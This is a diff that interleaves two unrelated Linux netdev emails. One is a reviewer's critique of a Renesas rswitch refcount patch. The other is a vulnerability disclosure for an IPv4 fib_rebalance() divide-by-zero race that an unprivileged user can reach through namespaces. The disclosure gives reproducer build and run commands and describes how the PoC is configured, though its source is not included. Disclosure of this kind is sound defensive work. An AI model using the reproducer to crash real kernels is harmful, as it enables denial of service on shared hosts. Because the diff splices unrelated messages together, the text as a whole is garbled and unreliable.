@@ -1,230 +1,967 @@
-Received: from OS0P286CU010.outbound.protection.outlook.com (mail-japanwestazon11011046.outbound.protection.outlook.com [40.107.74.46])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2586942586C;
-	Mon, 17 Aug 2026 13:12:04 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=40.107.74.46
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786972328; cv=fail; b=ReyxL7s1DyGtIaBbpjLSIRtkE40AZlZV3xyEI3d3KGB0bJdegN0goouYk38eq/mOBlkMqv3P6uy7GHlerwAU6F5K3YN2EehTsgLJQjCpqZX1aIAdM2EJG+VLlMWkLMLF0Ey7MGp4CG2FuPT1VkjFeRtgihPszuDdKSGWmqyJDJ0=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786972328; c=relaxed/simple;
-	bh=WnAezTYn1gyGWhTyNruwNgnu6gWVSpO3Xj00AWzecfE=;
-	h=From:To:CC:Subject:Date:Message-ID:References:In-Reply-To:
-	 Content-Type:MIME-Version; b=ude5c0q6TLgC/bn9BK766OJmO0VoEkX9jT5HT7wZZC932UikfzotLFwi4qt0I9i7bA/fT2i1QaEZNVYHdYt9cqSV2oYufW8Vo8ddpCyBW+9vO+7LNXlsINa9/LY75scTvXFIWlxGUvYa052f9j8G1RexjqGSdvizcxN4oFmcDJs=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=renesas.com; spf=pass smtp.mailfrom=renesas.com; dkim=pass (1024-bit key) header.d=renesas.com header.i=@renesas.com header.b=W50yYGRN; arc=fail smtp.client-ip=40.107.74.46
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=renesas.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=renesas.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 459FD42F70D
+	for <netdev@vger.kernel.org>; Mon, 17 Aug 2026 13:12:27 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1786972352; cv=none; b=hqMo4JbxBEuWnVcpboFMQjoJNlxaah+TNQcBX1iFgygzd/nFA5VbzVMZZk/NZA0a7WLbShnuR/M0BHQmJQkpBz44bkRn98o5JGBSA5EL/PUN4BqY93uxXa2Yul1W7DG5kbioCuk9SyimyzXFADiLvvLcDfg+1o0HQoMd86MofD4=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1786972352; c=relaxed/simple;
+	bh=kvfwiOI3fE1rb/Xy67mVj7ny0n1irT3fausIjYkuvtY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=A6KB09EjS7FO7A/Xy+Hq2rF96ICt72eL0T666v+oIyA1ZONkKzTl9mgyndKXZQaBs726CTuETTk+6jkZUM1+TyyAVOg/7gbt9gzMKnEa4y3HnyRN+SZLEDpZC4AQ7/kwQkmyRMrQK7VlqHsSGNezLa6rWCB5nLRCH3tijc88k+o=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XHFYvGLR; arc=none smtp.client-ip=209.85.210.178
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=renesas.com header.i=@renesas.com header.b="W50yYGRN"
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=gRpI1634N1BAgLv7i4xqS9rvSSUepycYwpBtdhLJ26Xd4Gf2H8pDqXLbT22rnaJSVD1V/vSqhhoBU++5mf7/IF32ftHcW9Vv2OYxX+qISpXwk7e0sQvgD4PgI4rDrYgXDQdS0IEFXqbkga2ejxIn6d+vswtkWuP3qCJPXZR2yCNARLUk3yV3q6ci1lwJN9aunuBHjVabvKoy6HY9Jklq9e/OD5NbhL3G1NeFbjZdoQ8Z1lsy7DITMOzYjTWliM/Tvt8DpDa6R8RB8byW0yomJWKD4WD//GVdXwuxqpVmtVljdc88Usbw+x+yblzJYBEk/6EGbNNONGnCX4zx6t7z7w==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=NLuNjWV8U3U7+9vYms8WHzoSFiKghqueKkWzZBYH7LA=;
- b=sZzvA/h4Kuf0H0oZFlD/COVSsYH1FW4HN+w622GjikRuTcA2XjidV/Ig9uO0G1MZTWbd6LPBaJvTBuYs3Rl/sj/bJ1gD8x+KYV9zHgA6/Yzru8rrNYKumpkBGgeKib8O0q2wFpRRKR2cu46uyrLthmGX52K6oFfwHQzt3V+LthGTQmI/nP7DHAVnV9C4vMhvWrr3bU2TvguVuMLgB5+z8PaZYoydy4DTnWj/NBVU82rjmHWJu5wxP5BKR4EuRoxd6q/uJlkyTUlvlYk2Zc+xmQ+WF9T5N8w1NagmMfnMVLMD44b1XWk1arOt3MuZdrH0RTNb7/vOWZQOhBxnADwlrg==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=renesas.com; dmarc=pass action=none header.from=renesas.com;
- dkim=pass header.d=renesas.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=renesas.com;
- s=selector1;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=NLuNjWV8U3U7+9vYms8WHzoSFiKghqueKkWzZBYH7LA=;
- b=W50yYGRNXPGCQqVn+sciOl3E3KxS17kaZqUHKFh8Sdzo/4PfM5f1Lb8KmcK60Mi5OZJxeOXhU8PZkIBt5Orh+EbzxT2nR2OfUkLbGLsr+OJwfAndpnRaMHzl9wWc4TIAHWehmpBXgUGiPVk/nUkbzJlHAYd0TgAp+Za8t3d7fS8=
-Received: from TY4PR01MB14282.jpnprd01.prod.outlook.com (2603:1096:405:20d::9)
- by TYCPR01MB10199.jpnprd01.prod.outlook.com (2603:1096:400:1ef::7) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.315.17; Mon, 17 Aug
- 2026 13:12:01 +0000
-Received: from TY4PR01MB14282.jpnprd01.prod.outlook.com
- ([fe80::655d:9c47:4499:eb3a]) by TY4PR01MB14282.jpnprd01.prod.outlook.com
- ([fe80::655d:9c47:4499:eb3a%5]) with mapi id 15.21.0315.016; Mon, 17 Aug 2026
- 13:12:01 +0000
-From: Michael Dege <michael.dege@renesas.com>
-To: manushprajwal <manushprajwal555@gmail.com>, Yoshihiro Shimoda
-	<yoshihiro.shimoda.uh@renesas.com>
-CC: Andrew Lunn <andrew+netdev@lunn.ch>, "davem@davemloft.net"
-	<davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski
-	<kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, "netdev@vger.kernel.org"
-	<netdev@vger.kernel.org>, "linux-renesas-soc@vger.kernel.org"
-	<linux-renesas-soc@vger.kernel.org>
-Subject: RE: [PATCH v2] net: ethernet: renesas: rswitch: fix device_node
- refcount leak in rswitch_get_port_node()
-Thread-Topic: [PATCH v2] net: ethernet: renesas: rswitch: fix device_node
- refcount leak in rswitch_get_port_node()
-Thread-Index: AQHdLCAiwvsD/tMOfESV4bKJu79G6LaiOb6w
-Date: Mon, 17 Aug 2026 13:12:01 +0000
-Message-ID:
- <TY4PR01MB14282E65E2588C32576740C5582A72@TY4PR01MB14282.jpnprd01.prod.outlook.com>
-References: <20260814190423.933-1-manushprajwal555@gmail.com>
-In-Reply-To: <20260814190423.933-1-manushprajwal555@gmail.com>
-Accept-Language: en-US, en-GB
-Content-Language: en-US
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=renesas.com;
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: TY4PR01MB14282:EE_|TYCPR01MB10199:EE_
-x-ms-office365-filtering-correlation-id: 5216616e-3e25-4827-1dbc-08defc612026
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam:
- BCL:0;ARA:13230040|376014|366016|1800799024|23010399003|18002099003|22082099003|56012099006|38070700021|11063799006|10067099003;
-x-microsoft-antispam-message-info:
- hw/34zw+atjPJNDhwqSm5uVAT8//HAaUkm0gccCp8+Yjdm3jHwQ0UVKQOmebV7QRmHvb2rEkg+zs4A8UutOStVLcuT/jT7WHs4CNzfKtIFmcoa1ZhsbenyEPmYZqnBOO9KNSqvxOeoih+FktO8gW9rl9HU3HCo7lYpCIzcCrnbspzzhjUaGitxx5O+SS+jdcgPsZGxwuIZFvhOv/eB2TrS8fF8hevp2/t/JelS4s9APyAU81ZSnv2mX9mFby+OZoKJzfAUlv74CShqJMLMu991xr0mkFJ5pUo8GDlOHZqrIeeOpJh0Xvf12M+h3iVEDKqnSp2hKE7gUMlhCx9SwiaDD9AG2PYih5fwXttiUYJJlokVROdwyFgVlfh/WZhlN1+CbwzR37z6EWZYc1fHkCAUSiMZFPTl0hpfgCO8PPJuK0piyyIPr59WmpjhgfA+hP11fCcfN1A//0a2hcLXmymvigPD8aUqKFocnPIZ2Ke3udV9K14LDEr4yJtJ36GmNVozvgnxxPf9Su1DgHNIJHYsBbazBhtsOktL/2jw7Qjj5LZppAdGGDQuHI5/Oq810bAvdQPP/bDnv73zemfSXNCYjgKj/HjH0E5ouGwuB5i7vIsMOLm4ipePJNch1ip0Evj0AFR0ZNkMi9TlZIEJU2ZbeZCyZvXdZ55nUvzP/G/vAzPvbAenogJ5i5o53lwZ2VMMcuq0Vq3JWf+yE3ur0PLA==
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:TY4PR01MB14282.jpnprd01.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(366016)(1800799024)(23010399003)(18002099003)(22082099003)(56012099006)(38070700021)(11063799006)(10067099003);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?us-ascii?Q?1SrxQbohVgfOmQH5O4KQAJFhqcbKsMMqp9BCa98EeOupq6qNHh+j2o2SPq7B?=
- =?us-ascii?Q?ZC4yUAm4zF7kGvzFfWzIhcMj+44uassBdV19Vgx4uoCMDOQ4gfy63OEjwFVF?=
- =?us-ascii?Q?b0uPfqcgyEyoVi0ZD5YPYqKZNBraKTDtloW18p6M1cd+D8dlxdrOsx5mphPf?=
- =?us-ascii?Q?YD/V8h2h2irEXpY7gYZ3ehBL8a/BHdMfOXh0uwuzy4yrUDeWUWsBfgu9i67F?=
- =?us-ascii?Q?0dER+3nXKTU7Z817whQUe1aITynkKMyMoLQmqYQsqzOgQAI7NGGa6Mwu+gQ4?=
- =?us-ascii?Q?eIEj9YUtICJnEl3gWKoaKeu35rJla0hM+5Q2+nQ7hbaX4d6piGbXWBE/lm3v?=
- =?us-ascii?Q?0G/TPbWkx93rwFOTglzdTWwBnit6Vs3p1kudIjFGQ+p5eQ4C+0EeUZUo0NhT?=
- =?us-ascii?Q?pTkfsJdsuEbHwVi+8mYW4zGtVrMqhrlywGxvlvRv+W1Djg6O2WcWRmU+XATp?=
- =?us-ascii?Q?d0RrE8rXp9Zcsnno9MC42FkAVn62Hw7shIpTv/MvaRstZ2lD4B48XcYyvr+D?=
- =?us-ascii?Q?/wJ9H1FZ0MiYMQO/QUe9W1qML0p1CcoIf8eDjVrmLnbHwQvbH5UBrcb1vm+z?=
- =?us-ascii?Q?oSh+1Vxl0eStkJ/ysaIx7DvyF/xOcQa7i/Muo3FkjNZ47dO0UICvxbzV0Mq9?=
- =?us-ascii?Q?XWDdPjgB/zZBHIWO2qHI0ImIFmNN76bM5rBgAMfT+NZO3PZ3bazc2gdAoeAs?=
- =?us-ascii?Q?0hvHb7UBzTuOP36GOS8FvSkUicBw+tizdcvrIMyE50gAWYW7iXRhdLnoLfx8?=
- =?us-ascii?Q?I40gky7ntjMpesYfbMeMirtb2Xyi7jYhzFKZST6qSJet0Nq8oNY2BojnMaal?=
- =?us-ascii?Q?1d8v44MiTMO5OvzNpwE/zUByugQexywkwVYW1sq2Vv/bSOsSJlZuAJiCJ833?=
- =?us-ascii?Q?PhSJdcehwxUVQuZOgFtzn7gaJzUErYLluwXR1oaLthBFrCZzE+oXhXBAhVzI?=
- =?us-ascii?Q?Ol2k9M1BSFp0ketR9UkrG5FY+9PWzkqt+ro8gT719/RIwXWikRluRa1dFtCc?=
- =?us-ascii?Q?mTthDSNGNBfQZHrNUOgLEm+NiXb2uEPlNw7ckqsSjZEX1HGiJK3aMgzCM2r9?=
- =?us-ascii?Q?2csMB4+ViGUQWQ/MXkZ6Dm3q8DSgeq/M62YxAukTQ0aG8jvl5EVXM37yeYEn?=
- =?us-ascii?Q?w1Hd9g9pXLJAbtR+zas+9qM/LjWHqD/UFtyeJ3Dwwev1GkEBgyrUd/MG5FLL?=
- =?us-ascii?Q?C2GdHbWmH0dtLB1oJ71iA/42v9m5ggMbp/+DdsQrea32ZDwHyqBaHV/feVPW?=
- =?us-ascii?Q?ubvmSA72MkDOXu3B4EObQJj3WU/0e8cdmr0mvpcFYdPT4rEBp67fWYw6XkTk?=
- =?us-ascii?Q?7ZfY1yRrnKJuvhIvtFVR8z7gZZM3DLps/hxan+juKHlLzB4ZA3P377b/fRw+?=
- =?us-ascii?Q?Yic5PU4PMgMLiltrNlaaAYTemot0NNeE4EKAFoD7KEl+Wa7wqK0ZraJqFtqH?=
- =?us-ascii?Q?pfioe+/bMK4rJrGy9XXo8ixP2t8TtbgwjCH/Cx75NjDz8y9ZgGjVA2gZO0TN?=
- =?us-ascii?Q?qZZ+zau1RjNTNapWRgC9PUjGCRxB64uUMsg94sDT8TZdT0fzGO45g7OAP5wB?=
- =?us-ascii?Q?5ON5uO/Bi5pRwWm1dX4GYlFrjBswg7wqRAbhdkOKyX4kcS2IwnNYe/wlDcWP?=
- =?us-ascii?Q?KP14/fDONvFzIIYnkYYlieSqbBimZN53DRMsem9HRHLE1kVJC3r4UtWyqHvL?=
- =?us-ascii?Q?qy8DReDsWwYQ5wkGPMjatGPxQS1CVIklnpb6U1aUUygXmLLiiYI0PKT+wrBo?=
- =?us-ascii?Q?ObL9IJ2P3w=3D=3D?=
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XHFYvGLR"
+Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-84a4d8fd6ecso3404551b3a.1
+        for <netdev@vger.kernel.org>; Mon, 17 Aug 2026 06:12:27 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1786972347; x=1787577147; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=VZglVl3JcSvekIeKjtaminBk0KvoxYcptKbb8DxhOsE=;
+        b=XHFYvGLRs/vh2uzRWt3sxkiLPpOUIEGGLtKKV/ZH0GF3wfxz+vXA/G8TdeQCSKHkge
+         8J3E0TrJFfHMPw8YuA6nrg/ULyhgddPqW+l9L5FyWyyYHSqnq2vYs4peE5gle/6yExd+
+         IAJf3GZ5ZNX2EnpBOXSeM7jb+xefjlaInAS7h3DiInz3URFU4tJN1yJICfCJYIYUGZaK
+         C785uMWZXTWS6yXSHaa+8DJto/yndLJUnTDax64TqSf0qfnj2eFV/CenWZxcMEMyhcjZ
+         U9f4UAWBaub6DsLYix+7MoP/EALPXyzNd6uT0KG/ajhZxmK/+xltl/L4cn0fIL/13fT7
+         E49A==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1786972347; x=1787577147;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=VZglVl3JcSvekIeKjtaminBk0KvoxYcptKbb8DxhOsE=;
+        b=lMIJFgAs5c8z1uyFxqR4vK25CXH0wkNw+g8MBu9QVsUuOWZUg7apDgFBhJaTX+kme4
+         7L+4ja02mxcBv0aQXKY/DZsz/uEvN0EEvCVqfsLTxL7sqImw9ROerJ64LQf5tkKoP93v
+         HKUw7Mge68Ae+Z7hjLOWZew7USJ812gDtKtxnnpcllcsw2uLwaNu+qA7CmQgoCoUAdjt
+         nOujdMUAHinXZNqVkHYZyjIn6TCxjlaniiBrRqCGtuUO7I8yfQRedwXjwA1KJ6xNPuGU
+         QkcoC3VSf7xZnI5FcbxGt75NAU+z51BpcM2FlOXBZsSqtzR5FR0T7wnS66KVxLtK7qOz
+         Dkiw==
+X-Gm-Message-State: AOJu0YxgrkhD57DIDjT9GGN6ntaDBSOQvMHhBS22a20WD8a3e0sH48aK
+	keh+ATHb0hy1pRyttNVC6xwkf19o2oKqXrNBU1/+rrFUlJBXbNyfyy/EM13T6DBT0tLiy8Q0XAI
+	cPtHGgeBuhzs=
+X-Gm-Gg: AR+sD13dfcEVq9WSZGHPSmiMT/Yal/1nN93DhJDJNceW1Oxj6Wm8U36psLssXVm4jbP
+	junW3n50WH6gDZK7FZsolHfYxSfs2vj8NIf4qbVzwS3zB6pi0rKkNOPWOce0UHpwCvoAQm9AF5g
+	E89Uf8juTs+HgRb2zmG/ZB4yVu0QN9XvF4SgZCI0p3MBgymYHz7WKM6MTz1s+P01o3SMsBpsz5I
+	T0n6ncw2SSVEiOIQ20AIzA3X6VQq+wfP3hRYYbJvt1/hPIQUBsolqye6PNFqlE0ocjVDDyiRaBj
+	XOlIBZromLHUkw2Jya0gDRn+7bHCw1NLTBjntOBt5t1WIZRzKwcl4fn5gMNd8WB2+ZRruJ6/c+3
+	e2ag/V7e4UzjdFER/oU3FiHrld7TZfZMashK6jYCU12blElQUsvVSq+aBK4sozMHdyopgcKCz0R
+	o/MOTn3FBYbZjuDD6uUpnTvbLO2rKMm3L26TZSM6EzphY6/65SG0JrZHFQYsY=
+X-Received: by 2002:a05:6a00:f8b:b0:84a:2e5f:d69c with SMTP id d2e1a72fcca58-84fde396e23mr27241581b3a.32.1786972346576;
+        Mon, 17 Aug 2026 06:12:26 -0700 (PDT)
+Received: from gmail.com ([115.196.71.116])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851b6fefb3asm261312b3a.53.2026.08.17.06.12.22
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 17 Aug 2026 06:12:25 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: horms@kernel.org,
+	davem@davemloft.net,
+	pch@ordbogen.com,
+	linux-kernel@vger.kernel.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net 0/1] ipv4: Fix fib_rebalance() divide-by-zero race
+Date: Mon, 17 Aug 2026 13:12:09 +0000
+Message-ID: <cover.1786812660.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-OriginatorOrg: renesas.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: TY4PR01MB14282.jpnprd01.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 5216616e-3e25-4827-1dbc-08defc612026
-X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Aug 2026 13:12:01.4208
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: 53d82571-da19-47e4-9cb4-625a166a4a2a
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: zk2jAXPyDRAbrtOij32suTjqcLOR57hpXlDP5w/it2Ty9GbR48klnaHct7FwxdF4P0WA+kZGWQkyb4xsLTn9W0KseSV7SiPlTIs3wzO3wWg=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: TYCPR01MB10199
+Content-Transfer-Encoding: 8bit
 
-Hello Manush,
+Hi Linux kernel maintainers,
 
-Besides the problem mentioned previously. The links on the interfaces do no=
-t come up.
+We found and validated an issue in net/ipv4/fib_semantics.c. The bug is reachable by a
+non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-> -----Original Message-----
-> From: manushprajwal <manushprajwal555@gmail.com>
-> Sent: Friday, August 14, 2026 9:04 PM
-> To: Yoshihiro Shimoda <yoshihiro.shimoda.uh@renesas.com>
-> Cc: Andrew Lunn <andrew+netdev@lunn.ch>; davem@davemloft.net; Eric Dumaze=
-t <edumazet@google.com>;
-> Jakub Kicinski <kuba@kernel.org>; Paolo Abeni <pabeni@redhat.com>; netdev=
-@vger.kernel.org; linux-
-> renesas-soc@vger.kernel.org; Manush Prajwal <manushprajwal555@gmail.com>
-> Subject: [PATCH v2] net: ethernet: renesas: rswitch: fix device_node refc=
-ount leak in
-> rswitch_get_port_node()
->=20
-> From: Manush Prajwal <manushprajwal555@gmail.com>
->=20
-> On an of_property_read_u32() failure, rswitch_get_port_node() set port to=
- NULL and jumped to the out
-> label before releasing the reference the
-> for_each_available_child_of_node() iterator was holding on it. Once port =
-was overwritten with NULL,
-> that reference could never be released since out: only put "ports", the p=
-arent node.
->=20
-> Rework the function around for_each_available_child_of_node_scoped()
-> instead of adding a manual of_node_put(), so the iterator's reference is =
-dropped automatically on
-> every exit path. Since port is the function's return value, take an expli=
-cit reference with
-> of_node_get() on the match before breaking out of the loop.
->=20
-> Signed-off-by: Manush Prajwal <manushprajwal555@gmail.com>
-> ---
-> v2: Rework using for_each_available_child_of_node_scoped() instead of
->     a manual of_node_put(), per Andrew Lunn's review.
->=20
->  drivers/net/ethernet/renesas/rswitch_main.c | 20 +++++++++-----------
->  1 file changed, 9 insertions(+), 11 deletions(-)
->=20
-> diff --git a/drivers/net/ethernet/renesas/rswitch_main.c b/drivers/net/et=
-hernet/renesas/rswitch_main.c
-> index 6fe9648163..ffdc42f430 100644
-> --- a/drivers/net/ethernet/renesas/rswitch_main.c
-> +++ b/drivers/net/ethernet/renesas/rswitch_main.c
-> @@ -1303,8 +1303,8 @@
->  /* Call of_node_put(port) after done */  static struct device_node *rswi=
-tch_get_port_node(struct
-> rswitch_device *rdev)  {
-> -	struct device_node *ports, *port;
-> -	int err =3D 0;
-> +	struct device_node *ports;
-> +	struct device_node *port =3D NULL;
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Here you declare "port"
->  	u32 index;
->=20
->  	ports =3D of_get_child_by_name(rdev->ndev->dev.parent->of_node,
-> @@ -1312,17 +1312,15 @@ static struct device_node *rswitch_get_port_node(=
-struct rswitch_device *rdev)
->  	if (!ports)
->  		return NULL;
->=20
-> -	for_each_available_child_of_node(ports, port) {
-> -		err =3D of_property_read_u32(port, "reg", &index);
-> -		if (err < 0) {
-> -			port =3D NULL;
-> -			goto out;
-> -		}
-> -		if (index =3D=3D rdev->etha->index)
-> +	for_each_available_child_of_node_scoped(ports, child) {
-But here you  use child.
+---- details below ----
 
-> +		if (of_property_read_u32(child, "reg", &index))
+Bug details:
 
-Same as above
+The fault executes in fib_rebalance() in net/ipv4/fib_semantics.c. It makes
+two passes over a multipath route: the first sums usable nexthop weights,
+while the second calculates their hash upper bounds. Both passes
+independently read the per-device ignore_routes_with_linkdown policy.
 
-> +			break;
-> +		if (index =3D=3D rdev->etha->index) {
-> +			port =3D of_node_get(child);
+Route insertion and link-state updates execute fib_rebalance() under
+RTNL, but the IPv4 sysctl handler can change this policy without RTNL.
+If every nexthop is link-down, a 1-to-0 policy change between the two
+passes leaves the first-pass total at zero and lets the second pass use
+the same nexthops, causing a divide error.
 
-Here too.
+The underlying root-cause fact first appeared in commit 0e884c78ee19
+("ipv4: L3 hash-based multipath"), which introduced the two-pass hash
+threshold calculation. Later changes refactored the nexthop accessors
+but retained the same unlocked policy reads, so Fixes points to the
+earliest commit that made this race possible.
+
+The patch serializes ignore_routes_with_linkdown sysctl writes with the
+per-net RTNL lock. Netlink devconf updates already use RTNL, so all
+runtime policy writers are now mutually exclusive with every
+fib_rebalance() trigger path. Thus the synchronization repair is in
+net/ipv4/devinet.c, at the mutable sysctl writer, rather than in the
+faulting calculation in net/ipv4/fib_semantics.c. The change adds no work
+to route lookup or rebalance paths.
+
+The fix relies on the existing fib_rebalance() caller contract: route
+insertion and netdevice link-state callers hold the per-net RTNL lock.
+Any future caller must preserve that contract before invoking
+fib_rebalance().
+
+The crash log below is the decoded output from the matching unpatched
+comparison kernel built from 24ef02f934ee ("net: page_pool: fix UAF in
+__page_pool_release_netmem_dma on xa_cmpxchg race"). Its release string is
+7.2.0-rc7-unfixed-24ef02f934ee+, and the fix commit 2080e22819c5 is not
+present in that kernel. The historical 6.12.95 reproduction remains
+separate; its exact vmlinux and source tree are unavailable here.
+
+The PoC explicitly leaves the veth peer v1 administratively down before
+bringing v0 up. This leaves v0 UP with no carrier, so all 200 nexthops are
+marked RTNH_F_LINKDOWN. The captured state confirms v1 DOWN and v0
+NO-CARRIER,UP, and the route dump contains 200 linkdown nexthops.
+The route_linkdown_count is 201 because its grep also counts the route
+header.
+
+On the patched 2080e22819c5 kernel, the same static PoC completed for both
+root and an unprivileged user in a user and network namespace without an
+Oops, divide error, panic, or fib_rebalance marker. The fixed-kernel root
+run retained the 200-nexthop linkdown route after the PoC completed.
+
+This patch does not trigger a rebalance of already-installed multipath
+routes when the sysctl changes. Existing upper bounds are still recomputed
+by the existing route-insertion and netdevice link-state paths; a sysctl
+write alone does not immediately recompute them. That pre-existing
+immediate-semantics behavior is unchanged; this patch only serializes the
+policy write with those rebalance paths.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+The default timeout is 30 seconds; the PoC prints its configuration and
+completion status before exiting. POC_TIMEOUT accepts 1 through 86400
+seconds.
+
+Complete PoC output from the patched kernel (root):
+
+    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
+    completed: worker threads stopped
+
+Complete PoC output from the patched kernel (unprivileged user namespace):
+
+    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
+    completed: worker threads stopped
+
+Output from the unpatched comparison before the divide-error Oops:
+
+    nh_count=200 on_usec=200 off_usec=50 route_cpu=0 toggle_cpu=1 timeout=30
+
+The following post-run veth and route dump is copied verbatim from the
+patched root run:
+
+----BEGIN veth/linkdown state----
+
+links:
+v0@v1            LOWERLAYERDOWN da:80:b2:58:92:fb <NO-CARRIER,BROADCAST,MULTICAST,UP,M-DOWN> 
+v1@v0            DOWN           da:82:c8:57:15:c2 <BROADCAST,MULTICAST> 
+route_linkdown_count:
+201
+route:
+198.51.100.1 linkdown 
+	nexthop via 10.0.0.2 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.3 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.4 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.5 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.6 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.7 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.8 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.9 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.10 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.11 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.12 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.13 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.14 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.15 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.16 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.17 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.18 dev v0 weight 1 onlink linkdown 
+	nexthop via 10.0.0.19 dev v0 weight 1 onlink linkdown 
